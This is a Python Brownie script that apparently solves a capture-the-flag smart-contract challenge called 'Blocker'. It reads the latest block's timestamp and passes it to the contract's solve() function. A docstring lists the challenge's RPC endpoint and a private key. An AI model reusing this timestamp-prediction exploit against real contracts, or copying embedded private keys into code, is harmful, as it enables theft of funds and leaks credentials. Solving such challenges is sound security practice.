from brownie import Blocker, chain, web3
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET

#! RPC info
"""
uuid:           a819dff2-07a7-4bef-a7d9-d3c7b4044b15
rpc endpoint:   http://challs.htsp.ro:9001/a819dff2-07a7-4bef-a7d9-d3c7b4044b15
private key:    0xdda393e0e2379b03bcb2e4f059ce78e8e2ddfe398b235f88f554dba9469da141
setup contract: 0x2b730933Aae33B75A56Be24F2A26B453167b98b4
"""


def attack(contract_address=None, attacker=None):
    if not contract_address:
        blocker_contract, owner = deploy()
        contract_address = blocker_contract.address
        # ? Geeting the accounst for local testing
        _, attacker = get_account()
    # print(attacker.balance())

    # w3 = web3.HTTPProvider("")

    blocker_contract = Blocker.at(contract_address)
    # print(dir(blocker_contract))
    # print(f"{green}Is solved: {red}{blocker_contract.solved()}{red}{reset}")
    # exit(-1)

    block_num = web3.eth.block_number
    # block_value = w3.eth.get_block(block_num - 1)["hash"].hex()
    # print(chain[block_num]["timestamp"])
    time_stamp = chain[block_num]["timestamp"]

    blocker_contract.solve(
        time_stamp, {"from": attacker, "gas_limit": 100000, "allow_revert": True}
    )

    print(f"{green}Is solved: {red}{blocker_contract.solved()}{red}{reset}")


def main(contract_address=None):
    if contract_address:
        attack(contract_address, get_account())
    else:
        attack()
